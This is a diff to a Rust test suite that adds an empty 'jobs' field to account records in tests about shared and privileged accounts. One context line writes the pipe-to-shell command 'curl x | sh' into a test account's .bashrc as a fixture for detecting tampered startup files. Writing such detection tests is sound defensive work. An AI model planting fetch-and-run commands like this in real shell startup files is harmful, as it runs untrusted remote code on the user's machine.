@@ -822,6 +822,7 @@ fn shared_or_privileged_accounts_are_never_unchanged() {
         programs_may_remain: true,
         privileged: false,
         processes: Vec::new(),
+        jobs: Vec::new(),
     });
     assert_eq!(shared.accounts[0].reason, Some(Reason::ProgramsMayRemain));
     assert!(shared.accounts[0].shared);
@@ -830,6 +831,7 @@ fn shared_or_privileged_accounts_are_never_unchanged() {
         programs_may_remain: false,
         privileged: true,
         processes: Vec::new(),
+        jobs: Vec::new(),
     });
     assert_eq!(privileged.accounts[0].reason, Some(Reason::Privileged));
     std::fs::write(granted.home.join(".bashrc"), "curl x | sh\n").unwrap();
@@ -838,6 +840,7 @@ fn shared_or_privileged_accounts_are_never_unchanged() {
         programs_may_remain: true,
         privileged: true,
         processes: Vec::new(),
+        jobs: Vec::new(),
     });
     assert_eq!(changed.accounts[0].state, State::NotChecked);
     assert_eq!(changed.accounts[0].reason, Some(Reason::Privileged));
@@ -947,6 +950,7 @@ fn a_later_report_on_a_shared_account_says_it_was_shared() {
         programs_may_remain: true,
         privileged: false,
         processes: Vec::new(),
+        jobs: Vec::new(),
     };
     let early = since_grant(
         &store,
